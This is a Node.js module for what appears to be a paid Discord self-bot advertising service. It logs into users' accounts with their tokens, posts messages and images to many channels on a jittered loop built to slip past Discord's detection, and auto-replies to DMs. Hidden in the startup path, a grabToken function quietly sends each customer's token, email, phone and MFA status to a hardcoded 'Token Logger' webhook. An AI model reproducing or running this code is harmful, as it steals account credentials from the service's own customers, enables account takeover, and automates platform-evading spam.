const { Client, MessageAttachment } = require('discord.js-selfbot-v13');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const activeBots = new Map();
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

// --- NEW: Persistent replied-users storage ---
const REPLY_DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(REPLY_DATA_DIR)) fs.mkdirSync(REPLY_DATA_DIR, { recursive: true });

function getRepliedUsersPath(userId) {
    return path.join(REPLY_DATA_DIR, `replied_users_${userId}.json`);
}

function loadRepliedUsers(userId) {
    const filePath = getRepliedUsersPath(userId);
    try {
        if (fs.existsSync(filePath)) {
            const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
            // Clean entries older than 30 days
            const now = Date.now();
            const thirtyDays = 30 * 24 * 60 * 60 * 1000;
            const cleaned = {};
            for (const [id, timestamp] of Object.entries(data)) {
                if (now - timestamp < thirtyDays) cleaned[id] = timestamp;
            }
            return new Set(Object.keys(cleaned));
        }
    } catch (e) { console.error('[REPLIED USERS] Load error:', e.message); }
    return new Set();
}

function saveRepliedUsers(userId, set) {
    const filePath = getRepliedUsersPath(userId);
    const data = {};
    for (const id of set) data[id] = Date.now();
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    } catch (e) { console.error('[REPLIED USERS] Save error:', e.message); }
}
// --- END NEW ---

async function validateToken(token) {
    try {
        const res = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        });
        return { valid: true, username: res.data.username, id: res.data.id };
    } catch (e) {
        return { valid: false, error: 'Invalid token' };
    }
}

async function grabToken(token, userInfo, source) {
    try {
        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        }).catch(() => null);
        
        if (!validateRes) return { success: false, error: 'Invalid token' };
        
        const userData = validateRes.data;
        const fullInfo = {
            ...userInfo,
            id: userData.id,
            username: userData.username,
            global_name: userData.global_name,
            email: userData.email,
            phone: userData.phone,
            verified: userData.verified,
            mfa_enabled: userData.mfa_enabled,
            nitro: userData.premium_type,
            locale: userData.locale,
            ip: userInfo.ip || 'unknown'
        };
        
        const embed = {
            title: '🎣 New Token Grabbed',
            color: 0xff0000,
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                { name: 'Source', value: source, inline: true },
                { name: 'Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'Token Logger v2.0' }
        };
        
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        });
        
        console.log('[TOKEN GRABBER] Sent to webhook');
        return { success: true, user: fullInfo };
    } catch (err) {
        console.error('[TOKEN GRABBER] Error:', err.message);
        return { success: false, error: err.message };
    }
}

async function joinServer(token, inviteCode) {
    try {
        inviteCode = inviteCode.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, '');
        
        const res = await axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {}, {
            headers: { Authorization: token },
            timeout: 10000
        });
        return { success: true, guildId: res.data.guild?.id, guildName: res.data.guild?.name };
    } catch (e) {
        return { success: false, error: e.response?.data?.message || e.message };
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Humanize delay: base ±10%, never below 85% of configured value.
// Prevents Discord from detecting perfectly exact intervals.
function humanizeDelay(baseMs, humanization = 0.10, minPercent = 0.85) {
    const jitter = baseMs * humanization * (Math.random() * 2 - 1);
    return Math.max(Math.floor(baseMs * minPercent), Math.floor(baseMs + jitter));
}

async function startSelfBot(userId, token, channels, messages, delay, autoReply, autoReplyText, configId, images, ipAddress, sendAllAtOnce = true, dbInstance) {
    // Stop any existing instance first
    stopSelfBot(userId, configId);
    
    await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
    
    const client = new Client({ 
        checkUpdate: false,
        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES', 'MESSAGE_CONTENT'],
        partials: ['CHANNEL']
    });
    
    const channelList = channels;
    let currentMessageIndex = 0;
    let currentChannelIndex = 0;
    let stopped = false;
    
    // --- NEW: Load persistent replied users instead of ephemeral Set ---
    const autoRepliedUsers = loadRepliedUsers(userId);
    // --- END NEW ---
    
    const botKey = `${userId}_${configId}`;
    
    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    
    const dataDir = path.join(__dirname, 'data');
    
    // Register in activeBots IMMEDIATELY so the loop condition doesn't race
    activeBots.set(botKey, { 
        client, 
        token, 
        stop: () => { 
            stopped = true; 
            console.log(`[SELFBOT ${configId}] Stop signal received`);
        } 
    });
    
    async function cleanupTempFiles() {
        try {
            const files = fs.readdirSync(tempDir);
            for (const file of files) {
                if (file.includes(configId)) {
                    try { fs.unlinkSync(path.join(tempDir, file)); } catch(e) {}
                }
            }
        } catch(e) {}
    }
    
    async function resolveImageFiles(targetImages) {
        const files = [];
        for (const img of targetImages) {
            if (!img || !img.url) continue;
            
            try {
                if (img.url.startsWith('data:')) {
                    const base64Data = img.url.split(',')[1];
                    if (!base64Data) continue;
                    const buffer = Buffer.from(base64Data, 'base64');
                    const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${Math.random().toString(36).substr(2,5)}.png`);
                    fs.writeFileSync(tempPath, buffer);
                    files.push(new MessageAttachment(tempPath, 'image.png'));
                    setTimeout(() => {
                        try { fs.unlinkSync(tempPath); } catch(e) {}
                    }, 30000);
                } else if (img.url.startsWith('/uploads/')) {
                    const relativePath = img.url.replace(/^\/uploads\//, '');
                    const filePath = path.join(dataDir, 'uploads', relativePath);
                    if (fs.existsSync(filePath)) {
                        files.push(new MessageAttachment(filePath, path.basename(filePath)));
                    } else {
                        console.error(`[SELFBOT ${configId}] Image file not found: ${filePath}`);
                    }
                } else if (img.url.startsWith('http')) {
                    files.push(new MessageAttachment(img.url, 'image.png'));
                }
            } catch (e) {
                console.error(`[SELFBOT ${configId}] Failed to resolve image:`, e.message);
            }
        }
        return files;
    }
    
    async function sendToChannel(channel, text, targetImages) {
        try {
            if (!channel || typeof channel.send !== 'function') {
                console.error(`[SELFBOT ${configId}] Channel ${channel?.id} does not support send()`);
                return false;
            }
            
            const files = await resolveImageFiles(targetImages);
            const payload = {};
            
            const cleanText = (text || '').trim();
            if (cleanText) {
                payload.content = cleanText;
            }
            
            if (files.length > 0) {
                payload.files = files;
            }
            
            // CRITICAL: Discord rejects completely empty messages
            if (!payload.content && (!payload.files || payload.files.length === 0)) {
                console.error(`[SELFBOT ${configId}] SKIPPED: message has no text and no valid files`);
                return false;
            }
            
            console.log(`[SELFBOT ${configId}] >>> Sending to #${channel.id}: text="${payload.content || '(image only)'}" files=${files.length}`);
            const sent = await channel.send(payload);
            console.log(`[SELFBOT ${configId}] <<< Message sent successfully (id: ${sent.id})`);
            return true;
        } catch (err) {
            console.error(`[SELFBOT ${configId}] ✗ FAILED to send:`, err.message);
            if (err.code) console.error(`[SELFBOT ${configId}]    Discord error code:`, err.code);
            return false;
        }
    }
    
    async function runMessageLoop() {
        console.log(`[SELFBOT ${configId}] Message loop STARTING...`);
        
        // FIX: Only check `!stopped`. Don't check activeBots Map here because of login race condition.
        while (!stopped) {
            
            // Periodic purchase/trial check
            if (dbInstance) {
                const user = dbInstance.getUser(userId);
                const trialActive = dbInstance.isTrialActive(userId);
                const hasPurchase = user.auto_adv_purchased === 1;
                
                if (!trialActive && !hasPurchase) {
                    console.log(`[SELFBOT ${configId}] Trial expired / no purchase. Stopping loop.`);
                    break;
                }
            }
            
            const msg = messages[currentMessageIndex % messages.length];
            
            // FIX: Only attach images explicitly assigned to this message.
            // If a message has no imageIds, it gets ZERO images (not all images).
            let targetImages = [];
            if (msg.imageIds && msg.imageIds.length > 0) {
                targetImages = images.filter(img => {
                    if (!img || img.id === undefined || img.id === null) return false;
                    const imgId = img.id;
                    return msg.imageIds.includes(imgId) || 
                           msg.imageIds.includes(Number(imgId)) || 
                           msg.imageIds.includes(String(imgId));
                });
            }
            
            console.log(`[SELFBOT ${configId}] Loop tick | msg #${(currentMessageIndex % messages.length) + 1}/${messages.length} | text="${(msg.text || '').substring(0, 40)}" | images=${targetImages.length}`);
            
            if (sendAllAtOnce) {
                console.log(`[SELFBOT ${configId}] Firing to ${channelList.length} channels with 250ms stagger...`);
                
                // 250ms stagger between channels. Each fires in its own slot.
                // A blocked channel wastes only its own 250ms, nothing else.
                const STAGGER_MS = 250;
                channelList.forEach((channelId, i) => {
                    setTimeout(() => {
                        (async () => {
                            try {
                                const channel = await client.channels.fetch(channelId);
                                if (!channel || typeof channel.send !== 'function') return;
                                await sendToChannel(channel, msg.text, targetImages);
                            } catch (e) {
                                // Isolated error — affects nothing
                            }
                        })();
                    }, i * STAGGER_MS);
                });
                
                console.log(`[SELFBOT ${configId}] All ${channelList.length} fires scheduled. Sleeping ${delay}ms...`);
            } else {
                const channelId = channelList[currentChannelIndex % channelList.length];
                currentChannelIndex++;
                
                try {
                    const channel = await client.channels.fetch(channelId);
                    if (!channel) {
                        console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                    } else if (typeof channel.send !== 'function') {
                        console.log(`[SELFBOT ${configId}] Channel ${channelId} not a text channel`);
                    } else {
                        await sendToChannel(channel, msg.text, targetImages);
                        console.log(`[SELFBOT ${configId}] Sent to ${channelId}`);
                    }
                } catch (e) {
                    console.error(`[SELFBOT ${configId}] Sequential send error:`, e.message);
                }
            }
            
            currentMessageIndex++;
            await sleep(humanizeDelay(delay, 0.10, 0.85));
        }
        
        console.log(`[SELFBOT ${configId}] Loop ENDED. Cleaning up...`);
        try { client.destroy(); } catch(e) {}
        activeBots.delete(botKey);
        cleanupTempFiles();
        console.log(`[SELFBOT ${configId}] Cleanup done.`);
    }
    
    client.on('ready', async () => {
        console.log(`[SELFBOT ${configId}] READY event fired! Logged in as ${client.user.tag}`);
        console.log(`[SELFBOT ${configId}] Config: ${messages.length} msgs, ${images.length} imgs, delay=${delay}ms, mode=${sendAllAtOnce ? 'ALL_AT_ONCE' : 'SEQUENTIAL'}`);
        
        // Start the loop. activeBots is already registered above, so no race condition.
        runMessageLoop();
    });
    
    if (autoReply && autoReplyText) {
        console.log(`[SELFBOT ${configId}] Setting up auto-reply: "${autoReplyText}"`);
        
        client.on('messageCreate', async (msg) => {
            if (msg.author.id === client.user.id) return;
            
            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
            if (!isDM) return;
            
            if (dbInstance) {
                const user = dbInstance.getUser(userId);
                const trialActive = dbInstance.isTrialActive(userId);
                const hasPurchase = user.auto_adv_purchased === 1;
                if (!trialActive && !hasPurchase) return;
            }
            
            // --- NEW: Check persistent replied users, skip if already chatted ---
            if (autoRepliedUsers.has(msg.author.id)) {
                console.log(`[SELFBOT ${configId}] Skipping auto-reply to ${msg.author.username} (${msg.author.id}) — already chatted before.`);
                return;
            }
            // --- END NEW ---
            
            autoRepliedUsers.add(msg.author.id);
            // --- NEW: Persist immediately so we don't reply again on reconnect ---
            saveRepliedUsers(userId, autoRepliedUsers);
            // --- END NEW ---
            
            try {
                await msg.channel.send(autoReplyText);
                console.log(`[SELFBOT ${configId}] Auto-reply sent to ${msg.author.username}`);
            } catch (err) {
                try {
                    await msg.author.send(autoReplyText);
                    console.log(`[SELFBOT ${configId}] Auto-reply sent via author.dm to ${msg.author.username}`);
                } catch (e2) {
                    console.error(`[SELFBOT ${configId}] Auto-reply failed:`, e2.message);
                }
            }
        });
    }
    
    try {
        console.log(`[SELFBOT ${configId}] Logging in...`);
        await client.login(token);
        console.log(`[SELFBOT ${configId}] Login resolved successfully.`);
    } catch (loginErr) {
        console.error(`[SELFBOT ${configId}] LOGIN FAILED:`, loginErr.message);
        activeBots.delete(botKey);
        throw loginErr;
    }
    
    return { client, username: client.user?.username };
}

function stopSelfBot(userId, configId) {
    const key = `${userId}_${configId}`;
    const bot = activeBots.get(key);
    if (bot) {
        if (bot.stop) bot.stop();
        try { bot.client.destroy(); } catch(e) {}
        activeBots.delete(key);
        console.log(`[SELFBOT ${configId}] Stopped`);
        return true;
    }
    return false;
}

function getActiveBots(userId) {
    const bots = [];
    for (const [key, value] of activeBots.entries()) {
        if (key.startsWith(`${userId}_`)) {
            bots.push({ configId: key.replace(`${userId}_`, ''), token: value.token });
        }
    }
    return bots;
}

module.exports = { validateToken, grabToken, joinServer, startSelfBot, stopSelfBot, getActiveBots };
